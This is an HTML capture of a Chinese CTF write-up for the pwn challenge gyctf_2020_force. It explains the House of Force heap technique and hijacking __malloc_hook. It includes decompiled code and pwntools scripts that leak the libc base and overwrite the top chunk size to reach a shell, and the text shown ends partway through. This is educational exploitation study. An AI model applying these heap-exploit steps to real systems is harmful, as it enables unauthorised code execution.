@@ -1,0 +1,591 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    HouseOfForce例题 | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="House Of Force 例题gyctf_2020_force(House of Force&amp;劫持 malloc_hook)参考资料：https:&#x2F;&#x2F;tamoly.github.io&#x2F;2025&#x2F;07&#x2F;12&#x2F;BUUCTF-PWN%E9%A2%98%E8%A7%A3&#x2F;gyctf_2020_force(House%20of%20Force%E5%92%8Csystem(‘bin%20sh’)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HouseOfForce例题">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/HouseOfForce%EF%BC%88topchunk%EF%BC%89/HouseOfForce%E4%BE%8B%E9%A2%98/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="House Of Force 例题gyctf_2020_force(House of Force&amp;劫持 malloc_hook)参考资料：https:&#x2F;&#x2F;tamoly.github.io&#x2F;2025&#x2F;07&#x2F;12&#x2F;BUUCTF-PWN%E9%A2%98%E8%A7%A3&#x2F;gyctf_2020_force(House%20of%20Force%E5%92%8Csystem(‘bin%20sh’)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773763874720-caa9a109-2b16-4a28-a3ae-bfc7431fed97-781340.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773763838362-92869b08-7878-4834-8603-133be3b96021-193520.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773764149427-8d9dd9d0-7a46-4d53-84bc-0158c1f5b545-347131.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773811873428-177b0c5a-dff8-4766-b909-eab8b381457e-830452.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773812095662-880c6c81-28ad-410f-a62d-aaa2412f4b29-201275.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773812701245-65f7a45a-7004-41a8-ad0e-f47e812be16b-926639.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773812736736-134d0ecf-2a6a-496b-9452-fbcde03e005a-180122.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773813161926-fca0b0d6-2c71-49fc-9bce-981121f79724-958087.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773813733544-58c0cbcd-efcb-400a-ac11-248ac142286f-352872.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773824641137-d11bc243-7eaf-414e-a02d-10a5e8c1031d-531399.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773824623216-c6470f8e-63ce-4806-8e2a-b298928311cb-379646.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773824847814-14de4542-d044-48dd-aef9-f08b55e2232a-212537.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773824828916-78c6f54b-21f4-4be6-a3fa-e7f37086a5d7-138072.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773826168309-6d258317-b786-4952-b866-37247e0c112d-971759.png">
+<meta property="article:published_time" content="2026-04-28T10:25:57.194Z">
+<meta property="article:modified_time" content="2026-04-28T11:19:30.397Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/zEfq0AduhIQgftQx/1773763874720-caa9a109-2b16-4a28-a3ae-bfc7431fed97-781340.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="HouseOfForce例题">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">HouseOfForce例题</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-Of-Force-%E4%BE%8B%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">House Of Force 例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gyctf-2020-force-House-of-Force-%E5%8A%AB%E6%8C%81-malloc-hook"><span class="toc-number">1.1.</span> <span class="toc-text">gyctf_2020_force(House of Force&amp;劫持 malloc_hook)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">1.1.1.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#put"><span class="toc-number">1.1.2.</span> <span class="toc-text">put</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mmap-%E7%94%B3%E8%AF%B7%E7%A9%BA%E9%97%B4%EF%BC%9A"><span class="toc-number">1.1.3.</span> <span class="toc-text">mmap 申请空间：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2-libc-%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.1.4.</span> <span class="toc-text">泄露 libc 基地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#House-of-force-%E4%BF%AE%E6%94%B9-top-chunk"><span class="toc-number">1.1.5.</span> <span class="toc-text">House of force 修改 top_chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BE%80-malloc-hook-%E4%B8%AD%E5%86%99%E5%85%A5-system"><span class="toc-number">1.1.6.</span> <span class="toc-text">往 malloc_hook 中写入 system</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86-top-chunk-%E6%89%A9%E5%B1%95%E5%88%B0-malloc-hook-%E9%99%84%E8%BF%91"><span class="toc-number">1.1.7.</span> <span class="toc-text">将 top chunk 扩展到 __malloc_hook 附近</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E5%86%85%E5%AE%B9%E4%B8%BA-system-%E7%9A%84%E5%A0%86%E5%9D%97"><span class="toc-number">1.1.8.</span> <span class="toc-text">创建内容为 system 的堆块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E7%94%B3%E8%AF%B7%E8%A7%A6%E5%8F%91-system-%E2%80%98-bin-sh%E2%80%99"><span class="toc-number">1.1.9.</span> <span class="toc-text">再次申请触发 system(‘&#x2F;bin&#x2F;sh’);</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="toc-number">1.1.10.</span> <span class="toc-text">获取 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0"><span class="toc-number">1.1.10.1.</span> <span class="toc-text">本地</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B"><span class="toc-number">1.1.10.2.</span> <span class="toc-text">远程</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/HouseOfForce（topchunk）/HouseOfForce例题" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:57.194Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="House-Of-Force-例题"><a href="#House-Of-Force-例题" class="headerlink" title="House Of Force 例题"></a>House Of Force 例题</h1><h3 id="gyctf-2020-force-House-of-Force-劫持-malloc-hook"><a href="#gyctf-2020-force-House-of-Force-劫持-malloc-hook" class="headerlink" title="gyctf_2020_force(House of Force&amp;劫持 malloc_hook)"></a>gyctf_2020_force(House of Force&amp;劫持 malloc_hook)</h3><p>参考资料：<a target="_blank" rel="noopener" href="https://tamoly.github.io/2025/07/12/BUUCTF-PWN%E9%A2%98%E8%A7%A3/gyctf_2020_force(House%20of%20Force%E5%92%8Csystem('bin%20sh'))/">https://tamoly.github.io/2025/07/12/BUUCTF-PWN%E9%A2%98%E8%A7%A3/gyctf_2020_force(House%20of%20Force%E5%92%8Csystem(‘bin%20sh’))&#x2F;</a>，不得不说这道题坑了我好久，libc 必须使用 BUUCTF 本地的，自己的 libc 还打不通，幸好有这一篇博客，赞</p>
+<p> 需要注意的是house offorse 只在libc2.23中可用 该漏洞在libc2.27中就被修复了  </p>
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773763874720-caa9a109-2b16-4a28-a3ae-bfc7431fed97-781340.png" alt="1773763874720-caa9a109-2b16-4a28-a3ae-bfc7431fed97.png"></p>
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773763838362-92869b08-7878-4834-8603-133be3b96021-193520.png" alt="1773763838362-92869b08-7878-4834-8603-133be3b96021.png"></p>
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> **i; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  __int64 size; <span class="comment">// [rsp+8h] [rbp-118h]</span></span><br><span class="line">  _BYTE s[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">for</span> ( i = (<span class="type">const</span> <span class="type">void</span> **)&amp;unk_202080; *i; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">char</span> *)i - (<span class="type">char</span> *)&amp;unk_202080 &gt; <span class="number">39</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xFu</span>);</span><br><span class="line">  size = atol(nptr);</span><br><span class="line">  *i = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !*i )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bin addr %p\n&quot;</span>, *i);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, (<span class="type">void</span> *)*i, <span class="number">0x50u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;done&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773764149427-8d9dd9d0-7a46-4d53-84bc-0158c1f5b545-347131.png" alt="1773764149427-8d9dd9d0-7a46-4d53-84bc-0158c1f5b545.png"></p>
+<h4 id="put"><a href="#put" class="headerlink" title="put"></a>put</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">put</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s_);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="mmap-申请空间："><a href="#mmap-申请空间：" class="headerlink" title="mmap 申请空间："></a>mmap 申请空间：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mmap</span><br><span class="line">mmap是memory <span class="built_in">map</span>的缩写即内存映射</span><br><span class="line">每在物理内存中开辟一块空间 然后利用mmap映射到虚拟内存中</span><br><span class="line">主线程既可用brk又可用mmap，子线程只能用mmap</span><br><span class="line">其次 主线程如果盛情的内存空间过大的话会直接用mmap在mmap段拿到一块大的空间 如果申请的比较小的话直接在data段向上拓展一段空间即可</span><br></pre></td></tr></table></figure>
+
+<h4 id="泄露-libc-基地址"><a href="#泄露-libc-基地址" class="headerlink" title="泄露 libc 基地址"></a>泄露 libc 基地址</h4><p>首先申请一个超级大的 chunk 触发 mmap，然后去打印这个 chunk 地址，减去对应偏移获取 libc 基地址。</p>
+<p>libc.address 只在知道 libc 文件的时候使用，是 pwntools 里的一个属性，其用途是设置 libc 库在内存中的基地址。一旦这个基地址被设置好哦，pwntools 就能自动计算出 libc 中各个函数和变量的实际地址。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="meta"># io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,28347)</span></span><br><span class="line">io= process(<span class="string">&#x27;./force&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./force&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size\n&quot;</span>, str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;bin addr &quot;</span>)</span><br><span class="line">    addr = <span class="type">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;content\n&quot;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">libc.address=add(<span class="number">0x200000</span>, <span class="string">&#x27;aaa\n&#x27;</span>)</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc.address :&quot;</span>+hex(libc.address))</span><br><span class="line">gdb.attach(io)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773811873428-177b0c5a-dff8-4766-b909-eab8b381457e-830452.png" alt="1773811873428-177b0c5a-dff8-4766-b909-eab8b381457e.png"><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773812095662-880c6c81-28ad-410f-a62d-aaa2412f4b29-201275.png" alt="1773812095662-880c6c81-28ad-410f-a62d-aaa2412f4b29.png"></p>
+<p>0x7f93b0600000 - 0x7f93b03ff010 &#x3D; 0x200ff0 获取堆块地址与libc 的固定偏移，可以计算我们的 libc 基地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="meta"># io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,28347)</span></span><br><span class="line">io= process(<span class="string">&#x27;./force&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./force&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">def add(size, content):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;size\n&quot;</span>, str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;bin addr &quot;</span>)</span><br><span class="line">    addr = <span class="type">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;content\n&quot;</span>,content)</span><br><span class="line">    <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line">libc.address=add(<span class="number">0x200000</span>, <span class="string">&#x27;aaa\n&#x27;</span>) + <span class="number">0x200ff0</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc.address :&quot;</span>+hex(libc.address))</span><br><span class="line">gdb.attach(io)</span><br></pre></td></tr></table></figure>
+
+<p>得到我们的 libc 基地址：</p>
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773812701245-65f7a45a-7004-41a8-ad0e-f47e812be16b-926639.png" alt="1773812701245-65f7a45a-7004-41a8-ad0e-f47e812be16b.png"></p>
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773812736736-134d0ecf-2a6a-496b-9452-fbcde03e005a-180122.png" alt="1773812736736-134d0ecf-2a6a-496b-9452-fbcde03e005a.png"></p>
+<p>验证一下，我们打印出来的 libc_address 确实是 libc 基地址。</p>
+<h4 id="House-of-force-修改-top-chunk"><a href="#House-of-force-修改-top-chunk" class="headerlink" title="House of force 修改 top_chunk"></a>House of force 修改 top_chunk</h4><p>有了 libc 基址后，开始使用 House of Force 手法通过溢出去修改 top chunk 的 size，同时把 ‘&#x2F;bin&#x2F;sh’ 写入 top chunk。溢出需覆盖到 top chunk 的 size 字段时篡改后的 size 需满足 (size &amp; 1) &#x3D;&#x3D; 1（即 PREV_INUSE 位为 1），否则 glibc 会认为前一个块空闲，触发合并逻辑，导致利用失败。）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">libc.address=add(<span class="number">0x200000</span>, <span class="string">&#x27;aaa\n&#x27;</span>)+<span class="number">0x200ff0</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc.address :&quot;</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line">top = add(<span class="number">0x18</span>,b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + b<span class="string">&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span> | <span class="number">0x1</span>)) + <span class="number">0x10</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;top :&quot;</span> + hex(top))</span><br><span class="line">gdb。attach(io)</span><br></pre></td></tr></table></figure>
+
+<p>地址+0x10 是为了直接覆盖到 size 位</p>
+<p><img src="/HFTTC.github.io/./img/zEfq0AduhIQgftQx/1773813161926-fca0b0d6-2c71-49fc-9bce-981121f79724-958087.png" alt="1773813161926-fca0b0d6-2c71-49fc-9bce-981121f79724.png"></p>
+<p>这里使用 p64(0xFFFFFFFFFFFFFFFF | 0x1) 强制设置PREV_INUSE 标志位</p>
